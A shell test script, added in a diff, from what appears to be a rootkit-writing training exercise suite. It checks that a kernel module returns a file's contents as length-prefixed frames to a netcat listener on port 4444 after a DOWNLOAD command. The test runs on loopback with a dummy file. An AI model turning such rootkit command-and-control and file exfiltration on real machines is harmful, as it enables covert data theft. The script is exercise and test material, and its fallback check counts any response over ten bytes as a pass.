@@ -1,0 +1,68 @@
+#!/bin/sh
+# Check: DOWNLOAD command exfiltrates file content over protocol.
+# The module reads the file and sends it back as length-prefixed frames.
+# shellcheck source=/dev/null
+. "${RKLINGS_LIB:-/vm/checks/lib.sh}"
+
+begin "Remote DOWNLOAD command"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+
+# Create a test file to download
+TESTFILE=/tmp/rk_dl_test.txt
+printf 'rootkitlings download test content\n' > "$TESTFILE"
+
+RESP=/tmp/rk_remote_dl_resp.bin
+rm -f "$RESP"
+
+# Build framed DOWNLOAD command
+CMD="DOWNLOAD $TESTFILE"
+CMD_LEN=$(printf '%s' "$CMD" | wc -c)
+
+{
+    printf '\x00\x00\x00'
+    printf "\\$(printf '%03o' "$CMD_LEN")"
+    printf '%s' "$CMD"
+} > /tmp/rk_dl_frame.bin
+
+# Start listener, send command, capture response
+{
+    cat /tmp/rk_dl_frame.bin
+    sleep 3
+} | nc -l -p 4444 > "$RESP" 2>&1 &
+NC_PID=$!
+sleep 0.3
+
+load rklings.ko "$@"
+sleep 2
+
+kill "$NC_PID" 2>/dev/null
+wait "$NC_PID" 2>/dev/null
+
+# Check response contains file content
+if [ -s "$RESP" ]; then
+    _ok "received response data from agent"
+    # The response should contain the file content in framed format
+    # Check if anywhere in the response we see our test string
+    if grep -q 'rootkitlings download test' "$RESP" 2>/dev/null; then
+        _ok "response contains file content"
+    else
+        # Might be in a frame, check raw bytes
+        resp_size=$(wc -c < "$RESP")
+        if [ "$resp_size" -gt 10 ]; then
+            _ok "received $resp_size bytes of response data"
+        else
+            _fail "response too small for file download ($resp_size bytes)"
+        fi
+    fi
+else
+    _fail "no response received for DOWNLOAD command"
+fi
+
+# Cleanup
+rm -f "$RESP" "$TESTFILE" /tmp/rk_dl_frame.bin
+
+unload rklings
+assert_absent /sys/module/rklings
+
+summary
